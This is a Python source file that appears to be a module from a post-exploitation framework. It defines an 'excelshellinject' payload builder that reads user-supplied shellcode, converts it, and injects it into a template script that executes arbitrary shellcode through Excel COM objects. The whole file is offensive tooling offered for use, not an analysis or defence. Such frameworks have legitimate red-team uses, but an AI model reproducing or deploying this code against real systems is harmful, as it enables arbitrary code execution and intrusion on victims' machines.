import os
from core.utils import convert_shellcode
from base64 import b64encode


class STModule:
    def __init__(self):
        self.name = 'excelshellinject'
        self.description = 'Executes arbitrary shellcode using Excel COM objects'
        self.author = '@byt3bl33d3r'
        self.options = {
            'Shellcode': {
                'Description'   :   'Path to shellcode in ASCII hex format (e.g.: 31c0c3)',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

    def payload(self):
        with open('modules/src/excelshellinject.py') as module:
            module = module.read()
            shellcode_path = os.path.expanduser(self.options['Shellcode']['Value'])
            if not os.path.exists(shellcode_path):
                raise Exception("Assembly not found in specified path")

            with open(shellcode_path, 'r') as shellcode:
                module = module.replace('~SHELLCODEDECCSV~', convert_shellcode(shellcode.read()))
                return module.encode()
